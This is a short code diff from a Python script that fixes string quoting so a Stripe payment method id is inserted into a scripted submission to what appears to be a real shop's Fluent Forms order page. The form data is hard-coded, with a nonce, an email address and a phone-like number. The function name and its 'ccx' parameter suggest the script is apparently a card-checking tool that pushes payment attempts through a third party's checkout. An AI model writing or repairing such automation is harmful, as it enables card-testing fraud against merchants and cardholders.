@@ -59,7 +59,7 @@ def Tele(ccx):
 	}
 
 	data = {
-			'data': '__fluent_form_embded_post_id=4295&_fluentform_5_fluentformnonce=86dae2bc93&_wp_http_referer=%2Forder-page%2F&email=banacolaa%40gmail.com&input_text=3124663122&description_2=Hello&description=24&description_3=Y&payment_input_2%5B%5D=Box+21%3A+Gerberas+%2C+%2430.00+each+box+shop+pickup+only+price&payment_method=stripe&payment_input_4%5B%5D=&payment_input%5B%5D=&payment_input_6%5B%5D=&__stripe_payment_method_id=+str(pm)+'',
+			'data': '__fluent_form_embded_post_id=4295&_fluentform_5_fluentformnonce=86dae2bc93&_wp_http_referer=%2Forder-page%2F&email=banacolaa%40gmail.com&input_text=3124663122&description_2=Hello&description=24&description_3=Y&payment_input_2%5B%5D=Box+21%3A+Gerberas+%2C+%2430.00+each+box+shop+pickup+only+price&payment_method=stripe&payment_input_4%5B%5D=&payment_input%5B%5D=&payment_input_6%5B%5D=&__stripe_payment_method_id='+str(pm)+'',
 			'action': 'fluentform_submit',
 			'form_id': '5',
 	}
